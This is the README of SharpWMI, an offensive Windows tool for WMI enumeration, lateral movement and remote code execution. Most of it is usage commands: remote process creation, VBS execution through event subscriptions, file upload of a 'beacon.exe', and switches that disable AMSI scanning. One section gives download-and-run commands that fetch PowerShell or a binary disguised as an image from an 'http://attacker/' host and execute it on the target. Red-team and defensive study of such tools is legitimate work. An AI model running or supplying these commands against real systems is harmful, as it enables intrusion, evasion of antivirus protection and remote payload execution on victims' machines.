
# SharpWMI

----

SharpWMI is a C# implementation of various WMI functionality. This includes local/remote WMI queries, remote WMI process creation through win32_process, and remote execution of arbitrary VBS through WMI event subscriptions. Alternate credentials are also supported for remote methods. 

[@harmj0y](https://twitter.com/harmj0y) is the primary author.

SharpWMI is licensed under the BSD 3-Clause license.

## Usage

```
  Local system enumeration:        
    SharpWMI.exe action=query query=""select * from win32_service"" [namespace=BLAH]

  Remote system enumeration: 
    SharpWMI.exe action=query [computername=HOST1[,HOST2,...]] query=""select * from win32_service"" [namespace=BLAH]

  Remote system Logged On users enumeration:
    SharpWMI.exe action=loggedon [computername=HOST1[,HOST2,...]]

  Remote process creation: 
    SharpWMI.exe action=exec [computername=HOST[,HOST2,...]] command=""C:\\temp\\process.exe [args]"" [amsi=disable] [result=true]

  Remote VBS execution: 
    SharpWMI.exe action=executevbs [computername=HOST[,HOST2,...]] [script-specification] [eventname=blah] [amsi=disable] [time-specs]

  File upload via WMI:
    SharpWMI.exe action=upload [computername=HOST[,HOST2,...]] source=""C:\\source\\file.exe"" dest=""C:\\temp\\dest-file.exe"" [amsi=disable]

  Remote firewall enumeration :
    SharpWMI.exe action=firewall computername=HOST1[,HOST2,...]
    
  List processes:
    SharpWMI.exe action=ps [computername=HOST[,HOST2,...]]

  Terminate process (first found):
    SharpWMI.exe action=terminate process=PID|name [computername=HOST[,HOST2,...]]

  Get environment variables (all if name not given):
    SharpWMI.exe action=getenv [name=VariableName] [computername=HOST[,HOST2,...]]

  Set environment variable
    SharpWMI.exe action=setenv name=VariableName value=VariableValue [computername=HOST[,HOST2,...]]

  Delete an environment variable
    SharpWMI.exe action=delenv name=VariableName [computername=HOST[,HOST2,...]]

NOTE: 
  - Any remote function also takes an optional ""username=DOMAIN\\user"" ""password=Password123!"".
  - If computername is not specified, will target localhost.
```

The `result=true` option on `action=exec` (alternatively `action=create`) makes SharpWMI to return command's output after remote WMI process creation. It works by storing command's output in an instance of arbitrary WMI object. That object would  then be fetched by callee and restored to it's original value.


### VBS Script execution:

The `executevbs` action was reworked as compared to the original version of SharpWMI.
Script specification defined in `[script-specification]` offers following methods to point this tool at target VBS code:

```
  A) Executes OS command via preset VBS code:
    SharpWMI.exe action=executevbs [...] command="notepad.exe"

  B) Downloads Powershell commands from URL and execute them from within VBS via Powershell's StdIn:
    SharpWMI.exe action=executevbs [...] url="http://attacker/myscript.ps1"

  C) Download a binary file from given URL, store it in specified path and then execute it:
                                         url="SOURCE_URL,TARGET_PATH"
    SharpWMI.exe action=executevbs [...] url="http://attacker/foo.png,%TEMP%\bar.exe"

  D) Download a binary file from given URL, store it in specified path and then execute arbitrary command:
                                         url="SOURCE_URL,TARGET_PATH"
    SharpWMI.exe action=executevbs [...] url="http://attacker/foo.png,%TEMP%\bar.exe" command="%TEMP%\bar.exe -some -parameters"

  E) Read VBS script from file and execute it:
    SharpWMI.exe action=executevbs [...] script="myscript.vbs"

  F) Execute given VBS script given literally:
    SharpWMI.exe action=executevbs [...] script="CreateObject(\\"WScript.Shell\\").Run(\\"notepad.exe\\")"

  G) Base64 decode input string being encoded VBS script and execute it on remote machine:
    SharpWMI.exe action=executevbs [...] scriptb64="Q3JlYXRlT2JqZWN0KCJXU2NyaXB0LlNoZWxsIi[...]"

  H) Read contents of given file, base64 decode them and then execute on target machine:
    SharpWMI.exe action=executevbs [...] scriptb64="myscript.vbs.b64"

  Finally, 'executevbs' action may have additional [time-specs] defined in seconds - they specify script trigger and wait timeouts:
    SharpWMI.exe action=executevbs [...] trigger=5 timeout=10
```


### Examples:

```
  SharpWMI.exe action=query query=""select * from win32_process""

  SharpWMI.exe action=query query=""SELECT * FROM AntiVirusProduct"" namespace=""root\\SecurityCenter2""

  SharpWMI.exe action=loggedon computername=primary.testlab.local

  SharpWMI.exe action=query computername=primary.testlab.local query=""select * from win32_service""

  SharpWMI.exe action=query computername=primary,secondary query=""select * from win32_process""

  SharpWMI.exe action=exec computername=primary.testlab.local command=""powershell.exe -enc ZQBj...""

  SharpWMI.exe action=exec computername=primary.testlab.local command=""whoami"" result=true amsi=disable

  SharpWMI.exe action=executevbs computername=primary.testlab.local command=""notepad.exe"" eventname=""MyLittleEvent"" amsi=disable

  SharpWMI.exe action=executevbs computername=primary.testlab.local username=""TESTLAB\\harmj0y"" password=""Password123!""

  SharpWMI.exe action=upload computername=primary.testlab.local source=""beacon.exe"" dest=""C:\\Windows\\temp\\foo.exe"" amsi=disable

  SharpWMI.exe action=terminate computername=primary.testlab.local process=explorer

  SharpWMI.exe action=getenv name=PATH computername=primary.testlab.local

  SharpWMI.exe action=setenv name=FOO value=""BAR"" computername=primary.testlab.local

  SharpWMI.exe action=delenv name=FOO computername=primary.testlab.local
```

Get local TCP netstat-style information from a remote Windows 10 machine:

    SharpWMI.exe action=query computername=COMPUTER query="Select LocalPort,OwningProcess from MSFT_NetTCPConnection" namespace="ROOT\StandardCIMV2"


## Compile Instructions

We are not planning on releasing binaries for SharpWMI, so you will have to compile yourself :)

SharpWMI has been built against .NET 3.5 and is compatible with [Visual Studio 2015 Community Edition](https://go.microsoft.com/fwlink/?LinkId=532606&clcid=0x409). Simply open up the project .sln, choose "release", and build.


## Authors

|Contribution  |Author  |
|--|--|
|Original SharpWMI implementation|[Will Schroeder @harmj0y](https://github.com/harmj0y)  |
|WMI code-exec output idea |[Evi1cg @Ridter](https://github.com/Ridter)  |
|AMSI evasion code taken from SharpMove |[Steven Flores 0xthirteen](https://github.com/0xthirteen)  |
|Enhancements, VBS flexibility, file upload |[Mariusz B. / mgeeky @mariuszbit](https://github.com/mgeeky)  |